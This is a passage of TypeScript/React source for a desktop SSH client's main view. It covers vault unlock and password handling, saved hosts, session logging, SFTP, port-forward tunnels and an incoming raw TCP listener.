          api.ListSnippetsFromFile().then(setExternalSnippets).catch(() => { });
        }
        if (api.ListForwardRules) {
          const rules = await api.ListForwardRules();
          setForwardRules(rules || []);
        }
        if (api.GetActiveTunnels) {
          const tunnels = await api.GetActiveTunnels();
          setActiveTunnels(tunnels || []);
        }
      } else {
        setVaultSummary({ groups: [], hosts: [], identities: [] });
        setNotes([]);
        setShowNotesModal(false);
        setOpenNotesDrawerHostId(null);
        setForwardRules([]);
        setActiveTunnels([]);
      }
    } catch {
      // Ignore during initial mount if bindings not ready
    }
  }, []);

  const refreshForwardState = useCallback(async (): Promise<void> => {
    const api = getWailsBindings();
    if (!api) return;
    try {
      if (api.ListForwardRules) {
        const rules = await api.ListForwardRules();
        setForwardRules(rules ? [...rules] : []);
      }
      if (api.GetActiveTunnels) {
        const tunnels = await api.GetActiveTunnels();
        setActiveTunnels(tunnels ? [...tunnels] : []);
      }
    } catch {
      // ignore
    }
  }, []);

  const refreshSyncInfo = useCallback(async (): Promise<void> => {
    const api = getWailsBindings();
    if (api?.GetVaultSyncInfo) {
      try {
        const info = await api.GetVaultSyncInfo();
        setSyncInfo(info);
      } catch {
        // ignore
      }
    }
  }, []);

  useEffect(() => {
    void refreshVaultState();
    void refreshSyncInfo();
    const api = getWailsBindings();
    if (api?.GetLiveSessionIDs) {
      void api.GetLiveSessionIDs().then((ids) => {
        if (Array.isArray(ids) && ids.length > 0) {
          setLiveSessions(new Set(ids));
        }
      }).catch(() => { });
    }
    const rt = getWailsRuntime();
    if (!rt) {
      return;
    }

    const offData = rt.EventsOn('terminal:data', (raw: unknown) => {
      const payload = raw as TerminalDataPayload;
      const sid = payload.sessionId || payload.sessionID || '';
      if (sid) {
        lastRxDataRef.current.set(sid, payload.data);
        setRxDataTicks((prev) => prev + 1);
        setLiveSessions((prev) => (prev.has(sid) ? prev : new Set(prev).add(sid)));
      }
      const writer = writersRef.current.get(sid);
      if (writer) {
        writer(payload.data);
      } else if (sid) {
        // Buffer incoming data so prompts or login banners arriving before TerminalView mounts are never lost
        const buf = pendingDataBuffers.current.get(sid) || [];
        buf.push(payload.data);
        pendingDataBuffers.current.set(sid, buf);
      }
    });

    const offPrompt = rt.EventsOn('ssh:hostkey-prompt', (raw: unknown) => {
      const info = raw as HostKeyPromptInfo;
      setHostKeyPrompt(info);
    });

    const offExit = rt.EventsOn('terminal:exit', (raw: unknown) => {
      let exitedId = '';
      let exitReason = '';
      if (typeof raw === 'string') {
        exitedId = raw;
      } else if (raw && typeof raw === 'object') {
        const obj = raw as Record<string, unknown>;
        exitedId = (obj.sessionId || obj.sessionID || '') as string;
        exitReason = (obj.reason || '') as string;
      }
      if (!exitedId) {
        return;
      }
      setLiveSessions((prev) => {
        if (!prev.has(exitedId)) return prev;
        const next = new Set(prev);
        next.delete(exitedId);
        return next;
      });
      writersRef.current.delete(exitedId);
      pendingDataBuffers.current.delete(exitedId);
      focusersRef.current.delete(exitedId);
      disposeTerminal(exitedId);
      setPaneFontSizes((prev) => {
        const next = new Map(prev);
        next.delete(exitedId);
        return next;
      });

      // Check if this was an intentional disconnect triggered by user action
      if (intentionalDisconnectsRef.current.has(exitedId)) {
        intentionalDisconnectsRef.current.delete(exitedId);
        setTabs((prev) => {
          const nextTabs: TabItem[] = [];
          for (const t of prev) {
            const panes = collectPanes(t.rootNode);
            const matchingPane = panes.find((p) => p.sessionId === exitedId);
            if (!matchingPane) {
              nextTabs.push(t);
              continue;
            }
            const newRoot = removePaneFromTree(t.rootNode, matchingPane.id);
            if (newRoot) {
              const remainingPanes = collectPanes(newRoot);
              const nextActiveId = remainingPanes.some((p) => p.id === t.activePaneId)
                ? t.activePaneId
                : remainingPanes[0]?.id || '';
              nextTabs.push({
                ...t,
                rootNode: newRoot,
                activePaneId: nextActiveId,
              });
            }
          }
          return nextTabs;
        });
        setStatusMessage('SSH session disconnected.');
        return;
      }

      // Unexpected disconnect: check if auto-reconnect is enabled (F-27)
      if (globalSettingsRef.current.autoReconnect !== false) {
        let foundPane: PaneItem | undefined;
        let foundTabId = '';
        for (const t of tabsRef.current) {
          const panes = collectPanes(t.rootNode);
          const p = panes.find((pane) => pane.sessionId === exitedId);
          if (p) {
            foundPane = p;
            foundTabId = t.id;
            break;
          }
        }
        if (foundPane && (foundPane.hostId || foundPane.title)) {
          startAutoReconnectRef.current?.(foundPane, foundTabId, 1, exitReason);
          setStatusMessage(`Connection dropped (${exitReason || 'disconnected'}). Auto-reconnecting...`);
          return;
        }
      }

      setTabs((prev) => {
        const nextTabs: TabItem[] = [];
        for (const t of prev) {
          const panes = collectPanes(t.rootNode);
          const matchingPane = panes.find((p) => p.sessionId === exitedId);
          if (!matchingPane) {
            nextTabs.push(t);
            continue;
          }
          const newRoot = removePaneFromTree(t.rootNode, matchingPane.id);
          if (newRoot) {
            const remainingPanes = collectPanes(newRoot);
            const nextActiveId = remainingPanes.some((p) => p.id === t.activePaneId)
              ? t.activePaneId
              : remainingPanes[0]?.id || '';
            nextTabs.push({
              ...t,
              rootNode: newRoot,
              activePaneId: nextActiveId,
            });
          }
        }
        return nextTabs;
      });
      setStatusMessage('SSH session disconnected.');
    });

    const offVaultLock = rt.EventsOn('vault:locked', (raw: unknown) => {
      setVaultLocked(Boolean(raw));
      void refreshVaultState();
    });

    const offForward = rt.EventsOn('forward:tunnels-updated', (raw: unknown) => {
      if (Array.isArray(raw)) {
        setActiveTunnels(raw as ForwardTunnelStatus[]);
      } else {
        void refreshForwardState();
      }
    });

    const offSync = rt.EventsOn('vault:sync_status', (raw: unknown) => {
      if (raw && typeof raw === 'object') {
        setSyncInfo(raw as VaultSyncInfo);
      }
    });

    const offRawTcpIncoming = rt.EventsOn('raw-tcp:incoming', (raw: unknown) => {
      const evt = raw as RawTcpIncomingEvent;
      if (evt?.sessionId) {
        setLiveSessions((prev) => new Set(prev).add(evt.sessionId));
        tabCounterRef.current += 1;
        const seq = tabCounterRef.current;
        const tabId = `rawtcp-in-tab-${seq}`;
        const paneId = `rawtcp-in-pane-${seq}-1`;
        const title = `TCP :${evt.listenerPort} <- ${evt.remoteAddr}`;
        const color = '#10b981';

        const newTab: TabItem = {
          id: tabId,
          title,
          color,
          tabType: 'terminal',
          activePaneId: paneId,
          rootNode: {
            type: 'pane',
            id: paneId,
            sessionId: evt.sessionId,
            title,
            paneType: 'terminal',
            isRawTcp: true,
            rawTcpHost: evt.remoteAddr,
            rawTcpPort: evt.listenerPort,
            initialLineMode: false,
          },
        };

        setTabs((prev) => [...prev, newTab]);
        setActiveTabId(tabId);
        setStatusMessage(`Incoming TCP connection caught on :${evt.listenerPort} from ${evt.remoteAddr}!`);
      }
    });

    void refreshRawTcpListeners();

    return () => {
      offData();
      offPrompt();
      offExit();
      offVaultLock();
      offForward();
      offSync();
      offRawTcpIncoming();
    };
  }, [refreshVaultState, refreshForwardState, refreshSyncInfo, refreshRawTcpListeners]);

  useEffect(() => {
    const handleDocumentClick = (e: MouseEvent): void => {
      const target = e.target as HTMLElement | null;
      if (!target?.closest('.nav-menu-container')) {
        setActiveDropdownMenu(null);
      }
      if (!target?.closest('.add-to-view-wrapper')) {
        setShowAddToViewMenu(false);
      }
    };
    document.addEventListener('click', handleDocumentClick);
    return () => document.removeEventListener('click', handleDocumentClick);
  }, []);

  // Restore workspace layout from workspace.json on launch (F-27)
  useEffect(() => {
    let mounted = true;
    const restoreWorkspace = async (): Promise<void> => {
      // If session restore is disabled, keep app clean and do not rehydrate dead restored- sessions
      if (globalSettingsRef.current.sessionRestoreEnabled !== true) {
        return;
      }
      const api = getWailsBindings();
      if (!api || !api.LoadWorkspace) return;
      try {
        const state = await api.LoadWorkspace();
        if (
          mounted &&
          state &&
          state.autoRestore &&
          Array.isArray(state.tabs) &&
          state.tabs.length > 0
        ) {
          const restoredTabs: TabItem[] = state.tabs.map((pt) => {
            const rehydrateNode = (pn: PersistedWorkspaceNode): WorkspaceNode => {
              if (pn.type === 'pane') {
                return {
                  type: 'pane',
                  id: pn.id,
                  sessionId: pn.sessionId || `restored-${pn.id}`,
                  hostId: pn.hostId,
                  title: pn.title || 'Terminal',
                  cwd: pn.cwd,
                  paneType: (pn.paneType as DockablePaneType) || (pn.hostId ? 'terminal' : 'launcher'),
                  notesHostId: pn.notesHostId,
                  sftpSessionId: pn.sftpSessionId,
                };
              }
              return {
                type: 'split',
                id: pn.id,
                direction: pn.direction === 'vertical' ? 'vertical' : 'horizontal',
                children: (pn.children || []).map(rehydrateNode),
                ratios: pn.ratios,
              };
            };
            return {
              id: pt.id,
              title: pt.title,
              hostId: pt.hostId,
              color: pt.color,
              tabType: pt.tabType,
              notesHostId: pt.notesHostId,
              activePaneId: pt.activePaneId,
              rootNode: rehydrateNode(pt.rootNode),
            };
          });

          setTabs(restoredTabs);
          if (state.activeTabId && restoredTabs.some((t) => t.id === state.activeTabId)) {
            setActiveTabId(state.activeTabId);
          }
          setStatusMessage('Workspace layout restored from previous session (workspace.json).');
        }
      } catch (err) {
        console.warn('Workspace restore error:', err);
      }
    };
    void restoreWorkspace();
    return () => {
      mounted = false;
    };
  }, []);

  // Automatically save workspace layout changes to workspace.json with debounce (F-27)
  useEffect(() => {
    if (globalSettings.sessionRestoreEnabled === false) return;
    if (tabs.length === 0) return;

    if (saveWorkspaceTimeoutRef.current) {
      clearTimeout(saveWorkspaceTimeoutRef.current);
    }

    saveWorkspaceTimeoutRef.current = setTimeout(() => {
      const api = getWailsBindings();
      if (!api || !api.SaveWorkspace) return;
      const state: WorkspaceState = {
        version: 1,
        activeTabId: activeTabId || '',
        autoRestore: true,
        tabs: tabs.map(sanitizeTabForPersistence),
      };
      void api.SaveWorkspace(state);
    }, 600);

    return () => {
      if (saveWorkspaceTimeoutRef.current) {
        clearTimeout(saveWorkspaceTimeoutRef.current);
      }
    };
  }, [tabs, activeTabId, globalSettings.sessionRestoreEnabled]);

  useEffect(() => {
    if (!showCommandPalette) {
      return;
    }
    const api = getWailsBindings();
    if (api?.SearchCommandPalette && !vaultLocked) {
      void api
        .SearchCommandPalette(paletteQuery)
        .then((res) => setPaletteResponse(res))
        .catch(() => {
          setPaletteResponse({
            query: paletteQuery,
            hostResults: searchHostsFuzzyLocal(vaultSummary.hosts, paletteQuery),
            quickConnect: parseQuickConnectLocal(paletteQuery),
          });
        });
    } else {
      setPaletteResponse({
        query: paletteQuery,
        hostResults: searchHostsFuzzyLocal(vaultSummary.hosts, paletteQuery),
        quickConnect: parseQuickConnectLocal(paletteQuery),
      });
    }
  }, [showCommandPalette, paletteQuery, vaultSummary.hosts, vaultLocked]);

  const handleQuickConnectFromPalette = async (qc: QuickConnectTarget): Promise<void> => {
    setAddress(qc.address);
    setPort(String(qc.port));
    setUsername(qc.user);
    setShowCommandPalette(false);
    setPaletteQuery('');
    const api = getWailsBindings();
    if (!api) {
      setStatusMessage(`Quick Connect ready for ${qc.display}`);
      return;
    }
    setStatusMessage(`Connecting to ${qc.display}...`);
    try {
      const id = await api.ConnectSSH({
        address: qc.address,
        port: qc.port,
        username: qc.user,
        password: palettePassword,
        privateKey: '',
        passphrase: '',
        size: { cols: 120, rows: 34 },
      });
      const matchedHost = vaultSummary.hosts.find(
        (h) => h.address.toLowerCase() === qc.address.toLowerCase()
      );
      openSessionTab(id, qc.display, matchedHost?.id, matchedHost?.color);
      setPalettePassword('');
      setStatusMessage(`Connected (${qc.display})`);
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setStatusMessage(`Connection failed: ${msg}`);
    }
  };

  const handleOpenVaultButton = (): void => {
    setModalError('');
    setShowVaultModal(true);
  };

  const handleInitializeVault = async (omitPassword: boolean): Promise<void> => {
    setModalError('');
    const pw = omitPassword ? '' : masterPassword;
    if (!omitPassword && !pw) {
      setModalError('Please enter a Master Password or choose "Skip Password for Now".');
      return;
    }
    if (!omitPassword && pw !== confirmPassword) {
      setModalError('Master password and confirmation do not match.');
      return;
    }
    const api = getWailsBindings();
    if (!api) {
      setVaultInitialized(true);
      setVaultLocked(false);
      setPasswordless(omitPassword);
      setShowVaultModal(false);
      setMasterPassword('');
      setConfirmPassword('');
      return;
    }
    try {
      await api.InitializeVault(pw);
      await refreshVaultState();
      setShowVaultModal(false);
      setMasterPassword('');
      setConfirmPassword('');
      setStatusMessage(
        omitPassword
          ? 'Vault initialized without a password. You can set a Master Password anytime in Vault Security.'
          : 'Vault initialized & encrypted (Argon2id + XChaCha20-Poly1305).'
      );
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setModalError(`Vault setup failed: ${msg}`);
    }
  };

  const handleInitializeWithHello = async (): Promise<void> => {
    setModalError('');
    const api = getWailsBindings();
    if (!api) {
      setVaultInitialized(true);
      setVaultLocked(false);
      setQuickUnlockReady(true);
      setShowVaultModal(false);
      return;
    }
    setHelloPending(true);
    try {
      await api.InitializeVaultWithHello();
      await refreshVaultState();
      setShowVaultModal(false);
      setStatusMessage('Vault created & protected with Windows Hello / Security Key + DPAPI.');
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setModalError(`Windows Hello setup failed: ${msg}`);
    } finally {
      setHelloPending(false);
    }
  };

  const handleVaultUnlock = async (e: React.FormEvent): Promise<void> => {
    e.preventDefault();
    setModalError('');
    const api = getWailsBindings();
    if (!api) {
      setVaultLocked(false);
      setShowVaultModal(false);
      setMasterPassword('');
      return;
    }
    try {
      await api.UnlockVault(passwordless ? '' : masterPassword);
      await refreshVaultState();
      setShowVaultModal(false);
      setMasterPassword('');
      setStatusMessage('Vault unlocked (Teal Theme Active).');
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setModalError(`Unlock failed: ${msg}`);
    }
  };

  const handleQuickUnlockHello = async (): Promise<void> => {
    setModalError('');
    const api = getWailsBindings();
    if (!api) {
      setVaultLocked(false);
      setShowVaultModal(false);
      return;
    }
    setHelloPending(true);
    try {
      await api.UnlockVaultWithHello();
      await refreshVaultState();
      setShowVaultModal(false);
      setStatusMessage('Vault unlocked via Windows Hello / Security Key.');
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setModalError(msg);
    } finally {
      setHelloPending(false);
    }
  };

  const handleEnableQuickUnlock = async (): Promise<void> => {
    const api = getWailsBindings();
    if (!api) {
      setQuickUnlockReady(true);
      return;
    }
    try {
      await api.EnableQuickUnlock();
      await refreshVaultState();
      setStatusMessage('Windows Hello / Security Key Quick Unlock enabled.');
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setModalError(`Could not enable Quick Unlock: ${msg}`);
    }
  };

  const handleChangePassword = async (e: React.FormEvent): Promise<void> => {
    e.preventDefault();
    setModalError('');
    const api = getWailsBindings();
    if (!api) {
      setPasswordless(newPassword === '');
      setShowSettingsModal(false);
      setCurrentPassword('');
      setNewPassword('');
      return;
    }
    try {
      await api.ChangeVaultPassword(passwordless ? '' : currentPassword, newPassword);
      await refreshVaultState();
      setShowSettingsModal(false);
      setCurrentPassword('');
      setNewPassword('');
      setStatusMessage(
        newPassword === ''
          ? 'Master password removed (vault is now in passwordless mode).'
          : 'Master password updated and vault re-encrypted.'
      );
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setModalError(`Password update failed: ${msg}`);
    }
  };

  const handleChangePasswordDirect = async (currPw: string, nextPw: string): Promise<void> => {
    setModalError('');
    const api = getWailsBindings();
    if (!api) {
      setPasswordless(nextPw === '');
      setStatusMessage('Password updated in preview mode.');
      return;
    }
    try {
      await api.ChangeVaultPassword(passwordless ? '' : currPw, nextPw);
      await refreshVaultState();
      setStatusMessage(
        nextPw === ''
          ? 'Master password removed (vault is now in passwordless mode).'
          : 'Master password updated and vault re-encrypted.'
      );
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setModalError(`Password update failed: ${msg}`);
      throw err;
    }
  };

  const handleResetVault = async (): Promise<void> => {
    setModalError('');
    const api = getWailsBindings();
    if (api) {
      await api.ResetVault();
      await refreshVaultState();
    } else {
      setVaultInitialized(false);
      setVaultLocked(true);
    }
    setShowVaultModal(false);
    setShowSettingsModal(false);
    setMasterPassword('');
    setStatusMessage('Vault reset (previous vault archived as .reset.bak). Ready for fresh setup.');
  };

  const handleVaultLock = async (): Promise<void> => {
    const api = getWailsBindings();
    if (api) {
      await api.LockVault();
      await refreshVaultState();
    } else {
      setVaultLocked(true);
    }
    setStatusMessage('Vault locked (Dark Crimson Theme Active).');
  };

  const handleSaveHost = async (e: React.FormEvent): Promise<void> => {
    e.preventDefault();
    const idSuffix = Date.now();
    const targetHostId = editingHostId || `host-${idSuffix}`;
    let identityId = editingIdentityId;
    const api = getWailsBindings();

    if (!identityId && (hostUser.trim() || hostPass || hostAuthMethod !== 'password')) {
      identityId = `id-${idSuffix}`;
    }

    if (identityId && (hostUser.trim() || hostPass || hostAuthMethod !== 'password')) {
      if (api) {
        await api.SaveIdentity({
          id: identityId,
          label: `${hostLabel.trim()} Identity`,
          username: hostUser.trim() || 'root',
          authMethod: hostAuthMethod,
          password: hostPass,
          keyId: hostAuthMethod === 'key' ? hostKeyId : undefined,
        });
      }
    }

    const parsedPort = Number(hostPort) || 0;
    const tagList = hostTags
      .split(',')
      .map((t) => t.trim())
      .filter(Boolean);
    const jumpChainList = hostProxyJump
      ? hostProxyJump
        .split(',')
        .map((s) => s.trim())
        .filter(Boolean)
      : undefined;

    if (api) {
      await api.SaveHost({
        id: targetHostId,
        label: hostLabel.trim(),
        address: hostAddr.trim(),
        port: parsedPort,
        groupId: hostGroupId,
        identityId,
        initialDir: hostInitialDir.trim() || undefined,
        tags: tagList,
        color: hostColor,
        favorite: false,
        proxyProfileId: hostProxyProfileId || undefined,
        proxyCommand: hostProxyCommand.trim() || undefined,
        jumpChain: jumpChainList,
        sessionLogging: hostSessionLogging ? true : undefined,
        engagementId: hostEngagementId || undefined,
      });
      await refreshVaultState();
    } else {
      // Preview mode fallback resolve
      const grp = vaultSummary.groups.find((g) => g.id === hostGroupId);
      const effPort = parsedPort > 0 ? parsedPort : grp?.defaultSettings.port || 22;
      const effUser = hostUser.trim() || grp?.defaultSettings.username || 'root';
      const effInitialDir = hostInitialDir.trim() || grp?.defaultSettings.initialDir || '';
      const effSessionLogging = hostSessionLogging || Boolean(grp?.defaultSettings.sessionLogging);
      const newHostItem = {
        id: targetHostId,
        label: hostLabel.trim(),
        address: hostAddr.trim(),
        effectivePort: effPort,
        effectiveUser: effUser,
        initialDir: effInitialDir,
        keepaliveSecs: grp?.defaultSettings.keepaliveSecs || 30,
        groupId: hostGroupId,
        identityId,
        tags: tagList,
        color: hostColor,
        favorite: false,
        proxyProfileId: hostProxyProfileId || undefined,
        proxyCommand: hostProxyCommand.trim() || undefined,
        jumpChain: jumpChainList,
        sessionLogging: effSessionLogging,
        engagementId: hostEngagementId || undefined,
      };

      setVaultSummary((prev) => {
        const existIdx = prev.hosts.findIndex((h) => h.id === targetHostId);
        if (existIdx >= 0) {
          const updated = [...prev.hosts];
          updated[existIdx] = newHostItem;
          return { ...prev, hosts: updated };
        }
        return {
          ...prev,
          hosts: [...prev.hosts, newHostItem],
        };
      });
    }

    setEditingHostId(null);
    setEditingIdentityId('');
    setShowHostPass(false);
    setHostLabel('');
    setHostAddr('');
    setHostPort('0');
    setHostGroupId('');
    setHostUser('');
    setHostPass('');
    setHostTags('');
    setHostColor('');
    setHostInitialDir('');
    setHostProxyProfileId('');
    setHostProxyCommand('');
    setHostProxyJump('');
    setHostSessionLogging(false);
    setHostEngagementId('');
    setShowAddHostModal(false);
  };

  const handleOpenEditHost = (h: HostSummary) => {
    setEditingHostId(h.id);
    setEditingIdentityId(h.identityId || '');
    setShowHostPass(false);
    setHostLabel(h.label);
    setHostAddr(h.address);
    setHostPort(String(h.effectivePort || 22));
    setHostGroupId(h.groupId || '');
    setHostUser(h.effectiveUser || '');
    setHostPass('');
    setHostTags((h.tags || []).join(', '));
    setHostColor(h.color || '');
    setHostInitialDir(h.initialDir || '');
    setHostProxyProfileId(h.proxyProfileId || '');
    setHostProxyCommand(h.proxyCommand || '');
    setHostProxyJump((h.jumpChain || []).join(', '));
    setHostSessionLogging(Boolean(h.sessionLogging));
    setHostEngagementId(h.engagementId || '');
    setHostAuthMethod('password');
    setShowAddHostModal(true);

    const api = getWailsBindings();
    if (api?.GetHostPassword) {
      api.GetHostPassword(h.id).then((pw) => {
        if (pw) {
          setHostPass(pw);
        }
      }).catch(() => {
        // vault may be locked or password not saved
      });
    }
  };

  const refreshSessionLogs = useCallback(async (): Promise<void> => {
    const api = getWailsBindings();
    if (api?.ListSessionLogs) {
      try {
        const list = await api.ListSessionLogs();
        setSessionLogs(list || []);
      } catch {
        // ignore
      }
    }
  }, []);

  const handleToggleSessionLog = async (
    targetSessionId: string,
    label?: string,
    hostId?: string
  ): Promise<void> => {
    const api = getWailsBindings();
    const isCurrentlyRecording = activeLogSessions.has(targetSessionId);

    if (isCurrentlyRecording) {
      if (api?.StopSessionLogging) {
        try {
          await api.StopSessionLogging(targetSessionId);
          await refreshSessionLogs();
        } catch (err: unknown) {
          const msg = err instanceof Error ? err.message : String(err);
          setStatusMessage(`Stop session logging failed: ${msg}`);
          return;
        }
      } else {
        const endedAt = new Date().toISOString();
        setSessionLogs((prev) =>
          prev.map((rec) =>
            rec.sessionId === targetSessionId && rec.active
              ? { ...rec, active: false, endedAt }
              : rec
          )
        );
      }
      setActiveLogSessions((prev) => {
        const next = new Set(prev);
        next.delete(targetSessionId);
        return next;
      });
      setStatusMessage(`Session logging stopped for ${label || targetSessionId}.`);
    } else {
      if (api?.StartSessionLogging) {
        try {
          await api.StartSessionLogging(targetSessionId);
          await refreshSessionLogs();
        } catch (err: unknown) {
          const msg = err instanceof Error ? err.message : String(err);
          setStatusMessage(`Start session logging failed: ${msg}`);
          return;
        }
      } else {
        const logId = `log-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
        const startedAt = new Date().toISOString();
        const tsFormatted = startedAt.replace('T', ' ').slice(0, 23);
        const transcript =
          `# DoubleAgent Session Transcript\n` +
          `# Host: ${label || targetSessionId}\n` +
          `# Session ID: ${targetSessionId}\n` +
          `# Started: ${startedAt}\n` +
          `# Security Policy: Password Echo & Sensitive Prompts Redacted\n` +
          `# ------------------------------------------------------------\n` +
          `[${tsFormatted}] ${label || targetSessionId}:~$ session recording active\n` +
          `[${tsFormatted}] [sudo] password for user: [PASSWORD ECHO SUPPRESSED]\n`;
        localLogTranscriptsRef.current.set(logId, transcript);
        const rec: SessionLogRecord = {
          id: logId,
          sessionId: targetSessionId,
          hostId: hostId || '',
          hostLabel: label || targetSessionId,
          filePath: `logs/${logId}.log`,
          startedAt,
          byteCount: transcript.length,
          lineCount: transcript.split('\n').filter(Boolean).length,
          active: true,
        };
        setSessionLogs((prev) => [rec, ...prev]);
      }
      setActiveLogSessions((prev) => {
        const next = new Set(prev);
        next.add(targetSessionId);
        return next;
      });
      setStatusMessage(`Recording session transcript for ${label || targetSessionId}.`);
    }
  };

  const handleReadSessionLog = async (logId: string): Promise<string> => {
    const api = getWailsBindings();
    if (api?.ReadSessionLog) {
      return await api.ReadSessionLog(logId);
    }
    return localLogTranscriptsRef.current.get(logId) || '';
  };

  const handleDeleteSessionLog = async (logId: string): Promise<void> => {
    const api = getWailsBindings();
    if (api?.DeleteSessionLog) {
      await api.DeleteSessionLog(logId);
      await refreshSessionLogs();
    } else {
      localLogTranscriptsRef.current.delete(logId);
      setSessionLogs((prev) => prev.filter((r) => r.id !== logId));
    }
    setStatusMessage('Deleted session log transcript.');
  };

  const handleExportSessionLog = async (logId: string, targetPath: string): Promise<void> => {
    const api = getWailsBindings();
    if (api?.ExportSessionLog) {
      await api.ExportSessionLog(logId, targetPath);
    }
    setStatusMessage(`Exported session log to ${targetPath}.`);
  };

  const handleConnectPane = async (
    node: PaneItem | Extract<WorkspaceNode, { type: 'pane' }>,
    tabId: string
  ): Promise<void> => {
    if (!node.hostId) return;
    const host = vaultSummary.hosts.find((h) => h.id === node.hostId);
    if (!host) return;

    const api = getWailsBindings();
    setConnectingPaneIds((prev) => new Set(prev).add(node.id));
    setStatusMessage(
      `Connecting to ${host.label} (${host.effectiveUser}@${host.address}:${host.effectivePort})...`
    );

    try {
      let newSessionId: string;
      if (api?.ConnectSavedHost) {
        newSessionId = await api.ConnectSavedHost(host.id, { cols: 120, rows: 34 });
      } else {
        newSessionId = `sess-preview-${host.id}-${Date.now()}`;
      }

      setLiveSessions((prev) => new Set(prev).add(newSessionId));

      setTabs((prev) =>
        prev.map((t) => {
          if (t.id !== tabId) return t;
          const replaceSid = (n: WorkspaceNode): WorkspaceNode => {
            if (n.type === 'pane') {
              if (n.id === node.id) {
                return { ...n, sessionId: newSessionId, title: host.label };
              }
              return n;
            }
            return { ...n, children: n.children.map(replaceSid) };
          };
          return { ...t, rootNode: replaceSid(t.rootNode) };
        })
      );

      if (host.sessionLogging) {
        setActiveLogSessions((prev) => new Set(prev).add(newSessionId));
        void refreshSessionLogs();
      }
      setStatusMessage(`Connected to ${host.label}`);
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setStatusMessage(`Connection failed: ${msg}`);
    } finally {
      setConnectingPaneIds((prev) => {
        const next = new Set(prev);
        next.delete(node.id);
        return next;
      });
    }
  };

  const handleConnectSavedHost = async (host: HostSummary): Promise<void> => {
    // If active tab or any open tab has a disconnected pane for this host, connect directly into it
    const activeTab = tabs.find((t) => t.id === activeTabId);
    if (activeTab) {
      const activePanes = collectPanes(activeTab.rootNode);
      const disc = activePanes.find((p) => p.hostId === host.id && !liveSessions.has(p.sessionId));
      if (disc) {
        await handleConnectPane(disc, activeTab.id);
        return;
      }
    }
    for (const t of tabs) {
      const tPanes = collectPanes(t.rootNode);
      const disc = tPanes.find((p) => p.hostId === host.id && !liveSessions.has(p.sessionId));
      if (disc) {
        setActiveTabId(t.id);
        await handleConnectPane(disc, t.id);
        return;
      }
    }

    const api = getWailsBindings();
    if (!api) {
      const previewId = `sess-preview-${host.id}-${Date.now()}`;
      openSessionTab(previewId, host.label, host.id, host.color);
      if (host.sessionLogging) {
        void handleToggleSessionLog(previewId, host.label, host.id);
      }
      setStatusMessage(`Connected to ${host.label}`);
      return;
    }
    setStatusMessage(`Connecting to ${host.label} (${host.effectiveUser}@${host.address}:${host.effectivePort})...`);
    try {
      const id = await api.ConnectSavedHost(host.id, { cols: 120, rows: 34 });
      setLiveSessions((prev) => new Set(prev).add(id));
      openSessionTab(id, host.label, host.id, host.color);
      if (host.sessionLogging) {
        setActiveLogSessions((prev) => {
          const next = new Set(prev);
          next.add(id);
          return next;
        });
        void refreshSessionLogs();
      }
      setStatusMessage(`Connected to ${host.label}`);
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setStatusMessage(`Connection failed: ${msg}`);
    }
  };

  const handleOpenHostSftp = async (host: HostSummary): Promise<void> => {
    const existingTab = tabs.find((t) => t.hostId === host.id);
    const existingSessionId = existingTab
      ? collectPanes(existingTab.rootNode).find(
        (p) => !p.sessionId.startsWith('serial-') && !p.sessionId.startsWith('local-')
      )?.sessionId
      : undefined;

    if (existingSessionId) {
      openSftpTab(existingSessionId, host.label, host.id);
      return;
    }

    const api = getWailsBindings();
    if (!api) {
      const previewId = `sess-preview-${host.id}-${Date.now()}`;
      openSftpTab(previewId, host.label, host.id);
      return;
    }

    setStatusMessage(`Connecting to ${host.label} for SFTP...`);
    try {
      const id = await api.ConnectSavedHost(host.id, { cols: 80, rows: 24 });
      openSftpTab(id, host.label, host.id);
      setStatusMessage(`SFTP opened for ${host.label}`);
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setStatusMessage(`SFTP connection failed: ${msg}`);
    }
  };

  const handleDeleteHost = async (hostId: string): Promise<void> => {
    const api = getWailsBindings();
    if (api) {
      await api.DeleteHost(hostId);
      await refreshVaultState();
    } else {
      setVaultSummary((prev) => ({
        ...prev,
        hosts: prev.hosts.filter((h) => h.id !== hostId),
      }));
    }
  };

  const handleSaveForwardRule = async (rule: ForwardRule): Promise<void> => {
    const api = getWailsBindings();
    if (api?.SaveForwardRule) {
      try {
        await api.SaveForwardRule(rule);
        await refreshForwardState();
        setStatusMessage(`Saved port forwarding rule "${rule.label || rule.type}".`);
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setStatusMessage(`Save forward rule failed: ${msg}`);
      }
    } else {
      setForwardRules((prev) => {
        const idx = prev.findIndex((r) => r.id === rule.id);
        if (idx >= 0) {
          const next = [...prev];
          next[idx] = rule;
          return next;
        }
        return [...prev, rule];
      });
    }
  };

  const handleDeleteForwardRule = async (ruleId: string): Promise<void> => {
    const api = getWailsBindings();
    if (api?.DeleteForwardRule) {
      try {
        await api.DeleteForwardRule(ruleId);
        await refreshForwardState();
        setStatusMessage('Deleted port forwarding rule.');
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setStatusMessage(`Delete forward rule failed: ${msg}`);
      }
    } else {
      setForwardRules((prev) => prev.filter((r) => r.id !== ruleId));
    }
  };

  const handleStartForwardTunnel = async (sessionIdToUse: string, ruleId: string): Promise<void> => {
    const api = getWailsBindings();
    if (!api?.StartForwardTunnel) {
      setStatusMessage('Wails backend not available to start tunnel.');
      return;
    }
    try {
      const tunnelId = await api.StartForwardTunnel(sessionIdToUse, ruleId);
      await refreshForwardState();
      setStatusMessage(`Started tunnel ${tunnelId}.`);
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setStatusMessage(`Start tunnel failed: ${msg}`);
    }
  };

  const handleStartTunnelWithHost = async (hostId: string, ruleId: string): Promise<void> => {
